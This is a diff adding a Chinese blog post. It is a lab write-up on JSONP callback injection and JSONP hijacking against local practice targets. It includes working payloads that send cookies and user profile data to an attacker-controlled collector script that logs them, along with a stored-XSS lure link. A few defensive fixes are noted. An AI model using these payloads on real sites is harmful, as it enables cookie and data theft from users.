@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>JSONP漏洞 |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-JSONP跨域"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  JSONP漏洞
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/09/23/JSONP%E8%B7%A8%E5%9F%9F/" class="article-date">
+  <time datetime="2023-09-23T15:25:25.000Z" itemprop="datePublished">2023-09-23</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE/">跨域访问</a> / <a class="article-category-link" href="/categories/%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE/php/">php</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">12 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="JSONP访问漏洞"><a href="#JSONP访问漏洞" class="headerlink" title="JSONP访问漏洞"></a>JSONP访问漏洞</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>centos虚拟机、windows、Mobaxterm</p>
+<p>centos安装了xampp，windwos安装了phpstudy</p>
+<h2 id="一、漏洞一-利用回调getcookie"><a href="#一、漏洞一-利用回调getcookie" class="headerlink" title="一、漏洞一:利用回调getcookie"></a>一、漏洞一:利用回调getcookie</h2><h2 id="使用1"><a href="#使用1" class="headerlink" title="使用1"></a>使用1</h2><p>虚拟机中list_json.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;pikachu&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;数据库连接失败&quot;</span>);</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&#x27;urf8&#x27;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id,username,password,level from users&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出json数据到页面</span></span><br><span class="line"><span class="variable">$json</span> =<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_all</span>(MYSQLI_ASSOC));</span><br><span class="line"><span class="comment">//echo $json;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>].<span class="string">&quot;(&quot;</span>.<span class="variable">$json</span>.<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于php文件对于回调参数<strong>没有进行校验</strong></p>
+<p>主机可构造list_json.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">args</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//alert(args);</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(args));</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.1.89/list_json.php?callback=alert(1);//&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>网页查看json数据<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        ....</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>相当于开发的前后端分离了</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230926084101027.png"></p>
+<p>将值传给服务器端(虚拟机)，服务器端将值进行拼接，构造出了一个调用本地js预先定义好的函数，以及传递给对应的实参</p>
+<p><code>alert(1);//</code>的效果，为：</p>
+<p>alert(1);&#x2F;&#x2F;json，json确实是传递了，但是被注释掉了</p>
+<p><code>alert(&#39;hello&#39;);//</code>也是可以的，弹出内容为hello字符串</p>
+<h2 id="小结1"><a href="#小结1" class="headerlink" title="小结1"></a>小结1</h2><p><del>从渗透方面讲，emmmm</del></p>
+<p><del>嘶，上面这个不太好从渗透方面讲，</del></p>
+<p><del>更像是前端(主机)和后端(虚拟机)的关系</del></p>
+<p>噢，不是这样滴</p>
+<p>虚拟机是受害者，主机是攻击者</p>
+<p>主机利用了虚拟机的后端文件漏洞，证明了Xss的存在</p>
+<h2 id="使用2"><a href="#使用2" class="headerlink" title="使用2"></a>使用2</h2><p><strong>但是</strong></p>
+<p>以上证明了一个xss漏洞的存在，这种反射型xss，怎么达到攻击目的呢？</p>
+<p>虚拟机添加一个xssrecv.php，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ipaddr</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">	<span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;pikachu&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;数据库连接不成功&quot;</span>);</span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;insert into xssdata(ipaddr,url,cookie) values(&#x27;<span class="subst">$ipaddr</span>&#x27;,&#x27;<span class="subst">$url</span>&#x27;,&#x27;<span class="subst">$cookie</span>&#x27;)&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//跳转链接</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;https://www.baidu.com&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>list_json.html内容改造如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   	</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">args</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//alert(args);</span></span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(args));</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.1.89/list_json.php?callback=location.href=&#x27;http://192.168.1.89/xssrecv.php?cookie=&#x27;%2Bdocument.cookie%2B&#x27;%26url=&#x27;%2Blocation.href;//&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>网页查看json数据<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        ....</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>主机上访问</p>
+<p><code>localhost:81/7/list_json.html</code></p>
+<p>url变化为：</p>
+<p><code>http://192.168.1.89/xssrecv.php?</code></p>
+<p><code>cookie=&amp;url=http://localhost:81/7/list_json.html</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230926092505353.png"></p>
+<p>刷新一下，就跳转到百度了</p>
+<p>发现url参数cookie为空啊</p>
+<p>本来没有cookie，我在f12控制台赋值了一个document，这样数据库应该有了</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230926101628005.png"></p>
+<p>所以访问</p>
+<p><code>localhost:81/7/list_json.html</code>之后，url跳转为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.89/xssrecv.php?cookie=data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&amp;url=http://localhost:81/7/list_json.html</span><br></pre></td></tr></table></figure>
+
+<p>再刷新一下，正常跳转到baidu.com</p>
+<p>虚拟机中数据库内容：</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230926102011766.png"></p>
+<h2 id="小结2"><a href="#小结2" class="headerlink" title="小结2"></a>小结2</h2><p>好，最终的结果是虚拟机的数据库里获得了主机的ip地址，还有cookie</p>
+<p>那么可以认为虚拟机是攻击方，主机是受害者</p>
+<p>虚拟机建立了数据库，用于接收从主机哪里传来的值</p>
+<p>而主机方是<strong>主动</strong>访问了这个网址</p>
+<p><code>localhost:81/7/list_json.html</code></p>
+<p>这个主动，有很多意思，上面这个链接可以是主机不知情的点击触发的，或者是其它方式，但一定比上面这种直接访问隐含地多，这样就清楚很多了。</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p><strong>就是函数名没做过滤</strong></p>
+<p>这个url太长了是吧，就不太正常，所以php校验时可以限制长度</p>
+<p>给php中添加：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">//长度限定</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>])&gt;<span class="number">10</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;too_long&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//白名单啊，callback参数值只能是限定的值</span></span><br><span class="line">    <span class="variable">$white_list</span>=[<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;handle&#x27;</span>,<span class="string">&#x27;haha&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> ! <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>],<span class="variable">$white_list</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;wrong_value&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键词校验啊，<code>location.href</code></p>
+<p>单引号转义啊</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从渗透角度看哈，</p>
+<p>受害者访问了一个网址，攻击者知道这个网址，及其传送的参数</p>
+<h2 id="二、漏洞二-利用CSRF获取数据"><a href="#二、漏洞二-利用CSRF获取数据" class="headerlink" title="二、漏洞二:利用CSRF获取数据"></a>二、漏洞二:利用CSRF获取数据</h2><p>主机作为攻击机，centos作为受害者</p>
+<p><del>我自己都要绕晕了</del></p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>DoraBox靶场<a target="_blank" rel="noopener" href="http://t.csdn.cn/QCY20">http://t.csdn.cn/QCY20</a></p>
+<p>jsonp劫持代码，审计一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;../class/function.class.php&quot;</span>;</span><br><span class="line">        <span class="variable">$reqMethod</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">        <span class="variable">$reqValue</span> = <span class="string">&quot;callback&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Func</span>(<span class="variable">$reqMethod</span>, <span class="variable">$reqValue</span>);</span><br><span class="line">        <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;Vulkey_Chen&#x27;</span>, <span class="string">&#x27;mobilephone&#x27;</span> =&gt; <span class="string">&#x27;13188888888&#x27;</span>, <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;admin@gh0st.cn&#x27;</span>, <span class="string">&#x27;address&#x27;</span> =&gt; <span class="string">&#x27;中华人民共和国&#x27;</span>, <span class="string">&#x27;sex&#x27;</span> =&gt; <span class="string">&#x27;Cool Man&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!@<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>])&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$p</span> -&gt; <span class="title function_ invoke__">con_function</span>(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$callback</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$callback&#125;</span>(&quot;</span> . <span class="variable">$p</span> -&gt; <span class="title function_ invoke__">con_function</span>(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>) . <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span>[</span><br></pre></td></tr></table></figure>
+
+<p><code> htmlspecialchars</code>转义了callback的内容，那这就杜绝了xss获取cookie的漏洞</p>
+<p><strong>在主机上：</strong></p>
+<p>构造jsonpuse.tml如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function test(args)&#123;</span><br><span class="line">	location.href=&quot;http://localhost:81/7/jsonprecv.php?value=&quot;+JSON.stringify(args)+</span><br><span class="line">	&quot;&amp;referer=&quot;+docunment.referer;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://192.168.1.89/DoraBox-master/csrf/jsonp.php?callback=test&quot;&gt;&lt;/script&gt;</span><br><span class="line">	&lt;!-- &lt;script src=&quot;http://192.168.1.89/list_json.php?callback=alert(document.cookie);//&quot;&gt;&lt;/script&gt; --&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        Yuleiyun</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>好，定义的jsonrecv.php页面如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ipaddr</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">	<span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;referer&#x27;</span>];</span><br><span class="line">	<span class="variable">$value</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$conn</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;pikachu&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;数据库连接不成功&quot;</span>);</span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;insert into xssdata(ipaddr,url,cookie) values(&#x27;<span class="subst">$ipaddr</span>&#x27;,&#x27;<span class="subst">$url</span>&#x27;,&#x27;<span class="subst">$value</span>&#x27;)&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//跳转链接</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;https://www.baidu.com&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>好，主机浏览器访问一下</p>
+<p><code>localhost:81/7/jsonpuse.html</code></p>
+<p>最终是跳转到baidu页面上</p>
+<p><em>每次需要手动刷新一下嘞，不然超时，跳不到baidu上</em></p>
+<p>f12控制台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cross-Origin Read Blocking (CORB) 已屏蔽 MIME 类型为 application/json 的跨域响应 https://hpd.baidu.com/v.gif?ct=2&amp;logFrom=feed_index&amp;logInfo=tts_show&amp;qid=0x85a6c6bf000e1813&amp;sid=39314_39283_39340_39396_39407_39097_39411_39359_39307_39303_39377_39233_26350_22160_39422&amp;ssid=public.1.5ae0317e.SeB1LbiHud60Zr8JjF8B6w&amp;logid=2148407315&amp;_r=0.20329129099560483&amp;tid=11545&amp;logExtra=%7B%22type%22%3A%22tts_button_show%22%2C%22res%22%3A%22news%22%7D&amp;r=l1695703237467&amp;isLogin=1。如需了解详情，请参阅 https://www.chromestatus.com/feature/5629709824032768。</span><br></pre></td></tr></table></figure>
+
+<p><strong>哦，可以理解，没有遵守同源策略(不是同协议)</strong></p>
+<p>看数据库，存到了json值</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230926123540771.png"></p>
+<p>那个ipaddr字段，之所以那样显示呢，因为主机上定义的localhost，如果是具体的ip，数据库就会正常记录的</p>
+<h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><p>token机制+校验机制</p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>总结一下哈，在渗透方面，其实是这样的</p>
+<p><strong>1.受害者在自己的浏览器上访问第三方网址并登录</strong></p>
+<p>受害者访问了下面这个链接：</p>
+<p><code>http://192.168.1.89/DoraBox-master/</code></p>
+<p>这样我们就认为它是登录了，这个靶场没这个功能哈，既然能访问这个链接，有显示东西，就默认用户成功登录了</p>
+<p><strong>2.攻击者构造一个jsonprecv.php文件</strong></p>
+<p>构造这个干什么？</p>
+<blockquote>
+<p>GET一些值</p>
+<p>插入进本机的数据库中</p>
+<p>再设置个跳转链接</p>
+</blockquote>
+<p>等着受害者触发嘞，就可以存储受害者的一些信息</p>
+<p><strong>3.受害者触发jsonpuse.html</strong></p>
+<p>这个内容干什么？</p>
+<p>攻击者已知下面这个网址</p>
+<p><code>http://192.168.1.89/DoraBox-master/csrf/jsonp.php?callback=test</code></p>
+<p>我们已知这个参数的效果是，调用了test方法，然后输出一些值在前端上</p>
+<p>那么，攻击者构造一个html，<strong>重新自定义</strong>这个test方法：</p>
+<p>方法内容，是<strong>访问攻击者</strong>的php文件，且将攻击者设定好的参数和值都带上去了，<strong>攻击者的数据库就获取到了受害者的信息</strong></p>
+<p><strong>4.开玩笑，受害者凭什么触发这个jsonpuse.html文件</strong></p>
+<p>也许是xss漏洞的缘故，比如去哪嵌入了一个点击按钮，受害者出于好奇点击这个了，这不巧了吗这不？</p>
+<p>当然了，还有受害者在登录了的同时，攻击者留言发他这样一个网址(短连接伪造)，说是有好康的，那受害者主动访问了这个链接也说不定</p>
+<p>这也是门学问啊</p>
+<p>总之，是让受害者主动触发，访问攻击者服务器，是这样一个目的。</p>
+<p>这样吧，来个xss存储触发csrf，更清楚一点</p>
+<p>主机访问 </p>
+<p><code>http://192.168.1.89/DoraBox-master/xss/stored_xss.php</code></p>
+<p>这样理解，<strong>主机</strong>也是一个登录用户，在存储型xss下，输入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;http://攻击机ip:81/7/jsonpuse.html&quot;</span>&gt;点我&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230926144952997.png"></p>
+<p>然后<strong>虚拟机</strong>用户，也访问了这个存储性xss页面，并点击</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230926145230711.png"></p>
+<p>受害者视角：点了之后进百度</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230926145506814.png"></p>
+<p>咦，但是攻击者的数据库里为空嘞</p>
+<p>分析一波：</p>
+<p>受害者点击了跳转链接，访问攻击者服务器中的html文件，进而又访问攻击者服务器的php文件，按理说能够写进去的嘞</p>
+<p><del>哦，应该是php文件连接mysql的话，用的ip地址有问题，是127.0.0.1，那改一下</del></p>
+<p>哦，不对，本机是可以访问127.0.0.1的</p>
+<p>emmm可以跳转那说明没问题噻，不知道</p>
+<p>待解决</p>
+<p>我在本机访问</p>
+<p><code>本机:81/7/jsonpuse.html</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsonprecv.php?value=&#123;&quot;username&quot;:&quot;Vulkey_Chen&quot;,&quot;mobilephone&quot;:&quot;13188888888&quot;,&quot;email&quot;:&quot;admin@gh0st.cn&quot;,&quot;address&quot;:&quot;%26%2320013%3B%26%2321326%3B%26%2320154%3B%26%2327665%3B%26%2320849%3B%26%2321644%3B%26%2322269%3B&quot;,&quot;sex&quot;:&quot;Cool%20Man&quot;&#125;&amp;referer=undefined</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个可以写进数据库</p>
+</blockquote>
+<p>虚拟机访问时，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.142:81/7/jsonprecv.php?value=&#123;%22username%22:%22Vulkey_Chen%22,%22mobilephone%22:%2213188888888%22,%22email%22:%22admin@gh0st.cn%22,%22address%22:%22%D6%D0%BB%AA%C8%CB%C3%F1%B9%B2%BA%CD%B9%FA%22,%22sex%22:%22Cool%20Man%22&#125;&amp;referer=undefined</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个是写不进数据库的</p>
+</blockquote>
+<p>我在本机里运行这行url，也写不进去</p>
+<p>好，我在虚拟机里访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsonprecv.php?value=&#123;&quot;username&quot;:&quot;Vulkey_Chen&quot;,&quot;mobilephone&quot;:&quot;13188888888&quot;,&quot;email&quot;:&quot;admin@gh0st.cn&quot;,&quot;address&quot;:&quot;%26%2320013%3B%26%2321326%3B%26%2320154%3B%26%2327665%3B%26%2320849%3B%26%2321644%3B%26%2322269%3B&quot;,&quot;sex&quot;:&quot;Cool%20Man&quot;&#125;&amp;referer=undefined</span><br></pre></td></tr></table></figure>
